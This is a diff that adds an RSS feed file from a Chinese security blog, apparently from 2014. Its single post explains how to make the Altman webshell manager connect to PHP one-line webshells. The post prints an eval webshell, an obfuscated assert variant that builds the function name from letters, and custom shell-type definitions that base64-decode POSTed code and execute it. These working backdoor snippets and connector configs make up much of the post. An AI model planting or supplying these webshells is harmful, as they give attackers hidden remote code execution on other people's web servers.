@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>eval on KeePwn&#39;s Notes</title>
+    <link>https://www.keepwn.com/tags/eval/</link>
+    <description>Recent content in eval on KeePwn&#39;s Notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh</language>
+    <copyright>© 2014 - 2021 KEEPWN.COM</copyright>
+    <lastBuildDate>Thu, 10 Jul 2014 00:00:00 +0000</lastBuildDate><atom:link href="https://www.keepwn.com/tags/eval/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Altman连接phpEval与phpAssert一句话木马</title>
+      <link>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</link>
+      <pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</guid>
+      <description>之前测试altman工具的时候，遇到了一个问题，现解决方法如下：
+Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：
+&amp;lt;customShellType&amp;gt;&amp;lt;basicSetting&amp;gt;&amp;lt;name&amp;gt;phpEval&amp;lt;/name&amp;gt;&amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @eval($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;&amp;lt;mainCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;None&amp;quot; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;&amp;lt;/basicSetting&amp;gt;&amp;lt;mainCodeSetting&amp;gt;&amp;lt;funcCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;Base64&amp;quot; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;&amp;lt;item&amp;gt;&amp;lt;![CDATA[print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();]]&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/mainCodeSetting&amp;gt;&amp;lt;/customShellType&amp;gt;eval函数执行php语句
+print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();时，
+确实是正确的。
+然而当使用某些变形php一句话木马，如：
+&amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;; $a($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;
+时，
+Altman就无法连接一句话木马了。
+原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(&amp;quot;-&amp;gt;|&amp;quot;)代码，后面的代码则直接报错了。
+所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：
+&amp;lt;customShellType&amp;gt;&amp;lt;basicSetting&amp;gt;&amp;lt;name&amp;gt;phpAssert&amp;lt;/name&amp;gt;&amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @assert($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;&amp;lt;mainCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;None&amp;quot; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;&amp;lt;/basicSetting&amp;gt;&amp;lt;mainCodeSetting&amp;gt;&amp;lt;funcCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;Base64&amp;quot; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;&amp;lt;item&amp;gt;&amp;lt;![CDATA[@eval(&amp;quot;print(&#39;-&amp;gt;|&#39;);&amp;quot;.base64_decode($_POST[$funcCode$]).&amp;quot;print(&#39;|&amp;lt;-&#39;);&amp;quot;);]]&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/mainCodeSetting&amp;gt;&amp;lt;/customShellType&amp;gt;PS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。</description>
+    </item>
+    
+  </channel>
+</rss>
